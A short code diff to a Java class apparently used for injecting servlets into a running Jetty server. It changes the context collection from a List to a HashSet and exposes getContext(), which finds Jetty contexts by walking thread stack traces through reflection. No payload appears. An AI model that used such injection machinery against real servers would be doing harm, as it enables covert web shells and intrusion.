@@ -6,6 +6,7 @@ import java.io.IOException;
 import java.io.PrintStream;
 import java.lang.reflect.*;
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
@@ -31,7 +32,7 @@ public class JettyServletInjector {
     }
 
     public JettyServletInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -77,8 +78,8 @@ public class JettyServletInjector {
         }
     }
 
-    private List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             try {
